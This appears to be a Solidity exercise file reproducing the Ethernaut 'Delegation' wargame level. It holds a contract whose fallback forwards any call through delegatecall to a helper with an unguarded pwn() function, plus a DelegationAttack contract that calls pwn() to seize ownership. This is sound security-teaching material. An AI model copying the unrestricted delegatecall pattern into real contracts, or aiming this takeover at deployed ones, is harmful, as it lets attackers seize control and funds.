// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract EthernautDelegate {
    address public owner;

    constructor(address initialOwner) {
        owner = initialOwner;
    }

    function pwn() external {
        owner = msg.sender;
    }
}

contract EthernautDelegation {
    address public owner;
    EthernautDelegate public delegate;

    constructor(address delegateAddress) {
        owner = msg.sender;
        delegate = EthernautDelegate(delegateAddress);
    }

    fallback() external payable {
        (bool success,) = address(delegate).delegatecall(msg.data);
        if (!success) revert("delegatecall failed");
    }
}

contract DelegationAttack {
    function attack(EthernautDelegation target) external {
        (bool success,) = address(target).call(abi.encodeWithSignature("pwn()"));
        require(success, "pwn failed");
    }
}

